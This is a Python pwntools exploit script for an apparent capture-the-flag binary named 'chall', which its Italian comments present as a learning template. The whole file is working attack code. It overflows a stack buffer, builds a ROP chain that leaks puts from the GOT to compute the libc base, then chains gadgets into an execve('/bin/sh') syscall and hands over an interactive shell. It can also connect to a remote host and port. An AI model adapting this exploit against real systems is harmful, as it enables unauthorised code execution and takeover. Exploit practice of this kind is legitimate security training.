#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("./chall")
libc = ELF("./libc.so.6")

context.binary = exe

URL = ''
PORT = 0

def start(argv=[], *a, **kw):
    # template fatto da greyhat00 per chi viene dopo.
    # usalo liberamente per imparare e sperimentare.
    # buona fortuna, lettore. Happy pwn!
    if args.R2:
        io = process([exe.path] + argv, *a, **kw)
        # changeme sys.main
        # parametri di r2 personalizzabili
        # es:
        # r2_cmd = "r2 -c 'db sym.foo+122; dc; Vpp; px @ section..got' -d " + str(io.pid)
        r2_cmd = "r2 -c 'db 0x0040122e; dc; Vpp' -d " + str(io.pid)
        
        subprocess.Popen(
            [
            "x-terminal-emulator",                  # open systen default terminal emulator
             "-e", 
             os.environ.get("SHELL", "/bin/sh"),    # execute default shell
             "-c", 
             r2_cmd],                               # with radare2 command
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        # pause the current python script until key pressed
        # manually added to avoid race condition waiting for r2 to start     
        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            log.error(
                "REMOTE mode selected but HOST or PORT is missing or invalid.\n"
                "Usage example:\n"
                "  ./exploit.py REMOTE 8.8.8.8 9999\n"
                "Or set URL and PORT variables in the script."
            )
            exit(1)

        log.info("Connecting to remote"+ str(host) + str(port_val))
        return remote(host, port_val)

    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)


io = start()
bof = 136

rop = ROP(exe)
new_buffer = exe.bss()+0x80 # padded to be sure
call_puts = 0x0040120a
payload = flat({bof-8:[
    new_buffer,
    rop.rax[0], exe.got['puts'],
    call_puts
    ]})
io.recvuntil(b"pond.\n")
io.sendline(payload)

puts_leak = u64(io.recvline()[:-1].ljust(8, b'\x00'))
libc.address = puts_leak - libc.sym.puts

success(f"puts address @ {hex(puts_leak)}")
success(f"libc address @ {hex(libc.address)}")

libc_rop = ROP(libc)
binsh = next(libc.search(b"/bin/sh\x00"))

# here you can do what u want
# for the meme, i'll put a shellcode
# because calling system is mainstream (i don't want to deal with the stack anymore)
call_shell = flat({bof:[
    libc_rop.rdi[0], binsh,
    libc_rop.rsi[0], 0,
    libc_rop.rdx[0], 0,
    rop.rax[0], 59,
    rop.syscall[0],
    ]})

io.sendline(call_shell)
warning("tadaaa! enjoy your shell")
io.interactive()